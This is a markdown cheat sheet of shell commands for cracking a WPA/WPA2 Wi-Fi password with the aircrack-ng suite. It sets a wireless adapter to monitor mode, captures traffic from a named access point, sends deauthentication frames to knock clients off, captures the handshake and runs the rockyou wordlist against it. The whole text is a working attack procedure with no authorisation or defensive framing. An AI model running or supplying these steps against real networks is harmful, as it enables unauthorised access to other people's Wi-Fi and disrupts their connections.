# ⛓ Cracking WPA/WPA2

```bash
# check wireless adapter
iwconfig

# start our wireless adapter in monitor mode.
airmon-ng start wlan0

# allows us to capture all the traffic that your wireless adapter can see 
airodump-ng wlan0

# next step : focus on one channel and capture sensitive information from it.
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
# 64:20:9F:15:4F:D7 : BSSID of the Access Point
# -c 6 : channel the Access Point is operating on
# -w : file you want to write to

# To crack the encrypted password, we need to have the at least one client authenticating the Access Point. If any client already authenticated with access point then we can de-authenticate their system so, that his system tries to automatically re-authenticate the same, here, we can easily capture their encrypted password in the process.
aireplay-ng –deauth 100 -a 64:20:9F:15:4F:D7 wlan0
# 100 : number of de-authenticate frames we are sending to the client
# 64:20:9F:15:4F:D7 : BSSID of the AP
# wlan0 : wireless monitoring adapter

# check if handshake in file :
aircrack-ng psk-01.cap 

# As per the above step, we forced the client to re-authenticate, airodump-ng will attempt to capture their password in the new 4-way handshake.
# check the same by going airodump-ng terminal whether we have been successfully capturing the 4-way handshake or not.

# As of now, we have the encrypted password in our psk.cap file; it is time to run that file against aircrack-ng tool using a password file of our choice.
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
